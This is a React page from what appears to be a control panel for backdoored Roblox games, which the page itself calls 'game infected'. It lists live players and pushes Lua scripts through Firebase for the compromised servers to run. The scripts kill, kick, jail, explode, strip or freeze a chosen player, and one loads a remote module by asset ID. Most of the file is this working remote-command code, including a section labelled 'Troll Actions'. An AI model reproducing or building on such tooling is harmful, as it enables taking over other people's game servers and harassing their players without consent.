import Nav from "../../components/Cabeçario";
import React, { useState, useEffect } from "react";
import "./styles.css";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import { faMagnifyingGlass, faInfo } from "@fortawesome/free-solid-svg-icons";
import { Slider, Typography, Box } from "@mui/material";
import { database, ref, set, remove } from "../../firebaseConfig";
import Popup from "../../components/Popup";

function Players() {
  const [players, setPlayers] = useState([]);
  const [selectedPlayer, setSelectedPlayer] = useState(0);
  const [userData, setUserData] = useState(null);
  const [showPopup, setShowPopup] = useState(false);
  const [popupText, setPopupText] = useState("");
  const [popupError, setPopupError] = useState(false);
  const [error, setError] = useState(null);
  const [walkSpeed, setWalkSpeed] = useState(16);
  const [jumpPower, setJumpPower] = useState(50);
  const [searchText, setSearchText] = useState("");

  useEffect(() => {
    const getUserData = () => {
      try {
        return {
          discordUsername:
            localStorage.getItem("discordUsername") ||
            sessionStorage.getItem("discordUsername"),
          avatar:
            localStorage.getItem("avatar") || sessionStorage.getItem("avatar"),
          discordRole:
            localStorage.getItem("discordRole") ||
            sessionStorage.getItem("discordRole"),
          robloxUsername:
            localStorage.getItem("robloxUsername") ||
            sessionStorage.getItem("robloxUsername"),
          discordId:
            localStorage.getItem("discordId") ||
            sessionStorage.getItem("discordId"),
        };
      } catch (err) {
        console.error("Erro ao acessar o armazenamento:", err);
        return null;
      }
    };

    const storedUserData = getUserData();

    if (!storedUserData || !storedUserData.discordUsername) {
      setError("Dados do usuário não encontrados.");
      return;
    }

    setUserData(storedUserData);

    const robloxUsername = storedUserData?.robloxUsername;

    if (!robloxUsername) {
      setError("Nome de usuário do Roblox não encontrado.");
      return;
    }

    const fetchPlayers = async () => {
      try {
        const userId = localStorage.getItem("userId");

        if (!userId) {
          console.error("ID do usuário não encontrado no localStorage.");
          return;
        }

        const response = await fetch(
          `https://eclipse-backend-9lxy.onrender.com/player/get?owner=${robloxUsername}&id=${userId}`
        );

        const data = await response.json();

        if (Array.isArray(data)) {
          const uniquePlayers = data.filter(
            (player, index, self) =>
              index === self.findIndex((p) => p.name === player.name)
          );

          setPlayers((prevPlayers) => {
            const changed =
              JSON.stringify(prevPlayers) !== JSON.stringify(uniquePlayers);
            return changed ? uniquePlayers : prevPlayers;
          });
        }
      } catch (error) {
        console.error("Erro ao buscar jogadores:", error);
      }
    };

    fetchPlayers();
    const interval = setInterval(fetchPlayers, 3000);

    return () => clearInterval(interval);
  }, []);

  const filteredPlayers = players.filter(
    (player) =>
      player.name.toLowerCase().includes(searchText.toLowerCase()) ||
      player.displayName.toLowerCase().includes(searchText.toLowerCase())
  );

  async function sendToRealtimeDB(format, getUsernameCallback) {
    const getUserData = () => {
      try {
        return {
          discordUsername:
            localStorage.getItem("discordUsername") ||
            sessionStorage.getItem("discordUsername"),
          avatar:
            localStorage.getItem("avatar") || sessionStorage.getItem("avatar"),
          discordRole:
            localStorage.getItem("discordRole") ||
            sessionStorage.getItem("discordRole"),
          robloxUsername:
            localStorage.getItem("robloxUsername") ||
            sessionStorage.getItem("robloxUsername"),
          discordId:
            localStorage.getItem("discordId") ||
            sessionStorage.getItem("discordId"),
        };
      } catch (err) {
        console.error("Erro ao acessar o armazenamento:", err);
        return null;
      }
    };

    const storedUserData = getUserData();

    if (!storedUserData || !storedUserData.discordUsername) {
      setError("Dados do usuário não encontrados.");
      return;
    }

    setUserData(storedUserData);

    const robloxUsernameStored = storedUserData?.robloxUsername;

    try {
      const robloxUsername = getUsernameCallback;

      if (!robloxUsername) {
        console.error("robloxUsername não encontrado.");
        setPopupText(
          "Error: robloxUsername not found. Please add your robloxUsername to the whitelist located on the Dashboard screen."
        );
        setPopupError(true);
        setShowPopup(true);
        setTimeout(() => setShowPopup(false), 4000);
        return;
      }

      let scriptData;

      if (format === "kill") {
        scriptData = `local player = game:GetService("Players"):FindFirstChild("${robloxUsername}")
  if player and player.Character then
    local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
    if humanoid then
      humanoid.Health = 0
    end
  end
  `;
      } else if (format === "Punish") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p and p.Character then p.Character:ClearAllChildren() end`;
      } else if (format === "Kick") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p then p:Kick() end`;
      } else if (format === "BringPlayer") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") local admin = game.Players:FindFirstChild("${robloxUsernameStored}") if p and p.Character and admin and admin.Character then p.Character:SetPrimaryPartCFrame(admin.Character:GetPrimaryPartCFrame()) end`;
      } else if (format === "TeleportTo") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") local admin = game.Players:FindFirstChild("${robloxUsernameStored}") if p and p.Character and admin and admin.Character then admin.Character:SetPrimaryPartCFrame(p.Character:GetPrimaryPartCFrame()) end`;
      } else if (format === "R6") {
        scriptData = `require(72724783812409):R6("${robloxUsername}")`;
      } else if (format === "RE") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p then p:LoadCharacter() end`;
      } else if (format === "Stun") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p and p.Character then local h = p.Character:FindFirstChildOfClass("Humanoid") if h then h.PlatformStand = true end end`;
      } else if (format === "Freeze") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p and p.Character then for _,v in pairs(p.Character:GetDescendants()) do if v:IsA("BasePart") then v.Anchored = true end end end`;
      } else if (format === "Thaw") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p and p.Character then for _,v in pairs(p.Character:GetDescendants()) do if v:IsA("BasePart") then v.Anchored = false end end end`;
      } else if (format === "GodMode") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p and p.Character then local h = p.Character:FindFirstChildOfClass("Humanoid") if h then h.MaxHealth = math.huge h.Health = math.huge end end`;
      } else if (format === "Semi-God") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p and p.Character then local h = p.Character:FindFirstChildOfClass("Humanoid") if h then h.MaxHealth = 500 h.Health = 500 end end`;
      } else if (format === "FreeFall") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p and p.Character then p.Character:SetPrimaryPartCFrame(CFrame.new(0, 500, 0)) end`;
      } else if (format === "Explode") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p and p.Character then local e = Instance.new("Explosion") e.Position = p.Character:GetPrimaryPartCFrame().p e.BlastRadius = 10 e.Parent = workspace end`;
      } else if (format === "Naked") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p and p.Character then for _,v in pairs(p.Character:GetDescendants()) do if v:IsA("Clothing") or v:IsA("Accessory") then v:Destroy() end end end`;
      } else if (format === "Jail") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}")
if p and p.Character and p.Character.PrimaryPart then
    local jailCenter = Vector3.new(1000, 10, 1000)
    local size = Vector3.new(10, 10, 10)

    local function createWall(pos, size)
        local part = Instance.new("Part")
        part.Size = size
        part.Position = pos
        part.Anchored = true
        part.Transparency = 0.5
        part.Material = Enum.Material.Glass
        part.CanCollide = true
        part.Parent = workspace
    end

    local cx, cy, cz = jailCenter.X, jailCenter.Y, jailCenter.Z
    local sx, sy, sz = size.X, size.Y, size.Z

    createWall(Vector3.new(cx, cy + sy/2, cz - sz/2), Vector3.new(sx, sy, 1)) -- Frente
    createWall(Vector3.new(cx, cy + sy/2, cz + sz/2), Vector3.new(sx, sy, 1)) -- Trás
    createWall(Vector3.new(cx - sx/2, cy + sy/2, cz), Vector3.new(1, sy, sz)) -- Esquerda
    createWall(Vector3.new(cx + sx/2, cy + sy/2, cz), Vector3.new(1, sy, sz)) -- Direita
    createWall(Vector3.new(cx, cy + sy, cz), Vector3.new(sx, 1, sz)) -- Topo
    createWall(Vector3.new(cx, cy, cz), Vector3.new(sx, 1, sz)) -- Chão

    p.Character:SetPrimaryPartCFrame(CFrame.new(jailCenter + Vector3.new(0, 1, 0)))
end
`;
      } else if (format === "Sit") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p and p.Character then local h = p.Character:FindFirstChildOfClass("Humanoid") if h then h.Sit = true end end`;
      } else if (format === "Forcefield") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p and p.Character then Instance.new("ForceField", p.Character) end`;
      } else if (format === "NoForcefield") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p and p.Character then for _,v in pairs(p.Character:GetChildren()) do if v:IsA("ForceField") then v:Destroy() end end end`;
      } else if (format === "Rinn") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p and p.Character then p.Character:SetPrimaryPartCFrame(CFrame.new(0, 9999, 0)) end`;
      } else if (format === "Small") {
        scriptData = `local p = game.Players:FindFirstChild("${robloxUsername}") if p and p.Character then for _,v in pairs(p.Character:GetDescendants()) do if v:IsA(\"BasePart\") then v.Size = v.Size * 0.5 end end end`;
      } else {
        return;
      }

      const scriptRef = ref(database, "playerscript/");
      await set(scriptRef, scriptData);

      console.log("Script enviado para o Firebase com sucesso!");

      setPopupText("Script successfully sent to game infected!");
      setPopupError(false);
      setShowPopup(true);
      setTimeout(() => setShowPopup(false), 4000);

      setTimeout(async () => {
        try {
          await remove(scriptRef);
          console.log("Script excluído do game infected após 6 segundos.");
        } catch (error) {
          console.error("Erro ao remover script do game infected:", error);
        }
      }, 4000);
    } catch (error) {
      console.error("Erro ao enviar script para o game infected:", error);
      setPopupText("Error sending script to game infected.");
      setPopupError(true);
      setShowPopup(true);
      setTimeout(() => setShowPopup(false), 4000);
    }
  }

  async function sendToRealtimeDBSpeedorJump(
    format,
    getUsernameCallback,
    Spvalue
  ) {
    try {
      const robloxUsername = getUsernameCallback;

      if (!robloxUsername) {
        console.error("robloxUsername não encontrado.");
        setPopupText(
          "Error: robloxUsername not found. Please add your robloxUsername to the whitelist located on the Dashboard screen."
        );
        setPopupError(true);
        setShowPopup(true);
        setTimeout(() => setShowPopup(false), 4000);
        return;
      }

      let scriptData;

      if (format === "Speed") {
        scriptData = `local playerName = "${robloxUsername}"
local speedValue = ${Spvalue}

local player = game.Players:FindFirstChild(playerName)
if player and player.Character then
	local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
	if humanoid then
		humanoid.WalkSpeed = speedValue
	end
end`;
      } else if (format === "Jump") {
        scriptData = `local playerName = "${robloxUsername}"
local jumpHeightValue = ${Spvalue}

local player = game.Players:FindFirstChild(playerName)
if player and player.Character then
	local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
	if humanoid then
		humanoid.UseJumpPower = false
		humanoid.JumpHeight = jumpHeightValue
	end
end

`;
      } else {
        return;
      }

      const scriptRef = ref(database, "playerscript/");
      await set(scriptRef, scriptData);

      console.log("Script enviado para o Firebase com sucesso!");

      setPopupText("Script successfully sent to game infected!");
      setPopupError(false);
      setShowPopup(true);
      setTimeout(() => setShowPopup(false), 4000);

      setTimeout(async () => {
        try {
          await remove(scriptRef);
          console.log("Script excluído do game infected após 6 segundos.");
        } catch (error) {
          console.error("Erro ao remover script do game infected:", error);
        }
      }, 4000);
    } catch (error) {
      console.error("Erro ao enviar script para o game infected:", error);
      setPopupText("Error sending script to game infected.");
      setPopupError(true);
      setShowPopup(true);
      setTimeout(() => setShowPopup(false), 4000);
    }
  }

  if (error) return <p>{error}</p>;

  return (
    <div className="mainPlayers">
      {showPopup && <Popup error={popupError} text={popupText} />}
      <Nav
        title="Players"
        subtitle="you have to be in the game"
        searchWidth="100%"
      />

      <div className="main-player">
        <div className="players">
          <div className="search">
            <div className="icon">
              <FontAwesomeIcon icon={faMagnifyingGlass} color="#c9c9c952" />
            </div>
            <input
              type="text"
              placeholder="Search Players"
              value={searchText}
              onChange={(e) => setSearchText(e.target.value)}
            />
          </div>
          {players.length === 0 ? (
            <div className="noplayer">
              <div className="icon">
                <FontAwesomeIcon icon={faInfo} />
              </div>
              <h1>Waiting For Game...</h1>
              <p>
                In order for the player list to load, your linked Roblox account
                must be in a server that is connected to eclipse
              </p>
            </div>
          ) : filteredPlayers.length === 0 ? (
            <div className="notfound">
              <p>no players found</p>
            </div>
          ) : (
            filteredPlayers.map((player, index) => (
              <div
                key={player.id}
                className={`player ${selectedPlayer === index ? "a" : ""}`}
                onClick={() => setSelectedPlayer(index)}
              >
                <img
                  src={player.thumbnail}
                  className="img"
                  alt={player.displayName}
                />
                <div className="text">
                  <h2>{player.displayName}</h2>
                  <p>@{player.name}</p>
                </div>
              </div>
            ))
          )}
        </div>

        {players.length > 0 && selectedPlayer !== null && (
          <div className="info-and-action">
            <div className="inform">
              <img
                src={players[selectedPlayer]?.thumbnail}
                className="img-inform"
              />
              <div className="content-actinform">
                <div className="text">
                  <h2>{players[selectedPlayer]?.displayName}</h2>
                  <p>@{players[selectedPlayer]?.name}</p>
                </div>

                <div className="action">
                  <Box
                    className="Box"
                    sx={{ background: "transparent", p: 2, borderRadius: 2 }}
                  >
                    <Typography className="Typography" color="white">
                      WalkSpeed ({walkSpeed})
                    </Typography>
                    <Slider
                      value={walkSpeed}
                      onChange={(e, newValue) => setWalkSpeed(newValue)}
                      onChangeCommitted={(e, newValue) =>
                        sendToRealtimeDBSpeedorJump(
                          "Speed",
                          players[selectedPlayer]?.name,
                          newValue
                        )
                      }
                      min={0}
                      max={100}
                      sx={{ color: "#333" }}
                    />

                    <Typography className="Typography" color="white">
                      JumpPower ({jumpPower})
                    </Typography>
                    <Slider
                      value={jumpPower}
                      onChange={(e, newValue) => setJumpPower(newValue)}
                      onChangeCommitted={(e, newValue) =>
                        sendToRealtimeDBSpeedorJump(
                          "Jump",
                          players[selectedPlayer]?.name,
                          newValue
                        )
                      }
                      min={0}
                      max={100}
                      sx={{ color: "#333" }}
                    />
                  </Box>
                </div>
              </div>
            </div>
            <div className="essential-actions">
              <h1>Essential Actions</h1>
              <div className="boxs">
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("Punish", players[selectedPlayer]?.name)
                  }
                >
                  <p>Punish</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("Kick", players[selectedPlayer]?.name)
                  }
                >
                  <p>Kick</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB(
                      "BringPlayer",
                      players[selectedPlayer]?.name
                    )
                  }
                >
                  <p>Bring Player</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB(
                      "TeleportTo",
                      players[selectedPlayer]?.name
                    )
                  }
                >
                  <p>Teleport To</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("R6", players[selectedPlayer]?.name)
                  }
                >
                  <p>R6 Player</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("RE", players[selectedPlayer]?.name)
                  }
                >
                  <p>Respawn Player</p>
                </div>
              </div>
            </div>

            <div className="troll-actions">
              <h1>Troll Actions</h1>
              <div className="boxs">
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("kill", players[selectedPlayer]?.name)
                  }
                >
                  <p>Kill</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("Stun", players[selectedPlayer]?.name)
                  }
                >
                  <p>Stun</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("Freeze", players[selectedPlayer]?.name)
                  }
                >
                  <p>Freeze</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("Thaw", players[selectedPlayer]?.name)
                  }
                >
                  <p>Thaw</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("GodMode", players[selectedPlayer]?.name)
                  }
                >
                  <p>God Mode</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("Semi-God", players[selectedPlayer]?.name)
                  }
                >
                  <p>Semi-God Mode</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("FreeFall", players[selectedPlayer]?.name)
                  }
                >
                  <p>Free Fall</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("Explode", players[selectedPlayer]?.name)
                  }
                >
                  <p>Explode</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("Naked", players[selectedPlayer]?.name)
                  }
                >
                  <p>Naked</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("Jail", players[selectedPlayer]?.name)
                  }
                >
                  <p>Jail</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("Sit", players[selectedPlayer]?.name)
                  }
                >
                  <p>Sit</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB(
                      "Forcefield",
                      players[selectedPlayer]?.name
                    )
                  }
                >
                  <p>Forcefield</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB(
                      "NoForcefield",
                      players[selectedPlayer]?.name
                    )
                  }
                >
                  <p>No Forcefield</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("Rinn", players[selectedPlayer]?.name)
                  }
                >
                  <p>Rinn</p>
                </div>
                <div
                  className="box"
                  onClick={() =>
                    sendToRealtimeDB("Small", players[selectedPlayer]?.name)
                  }
                >
                  <p>Small</p>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default Players;
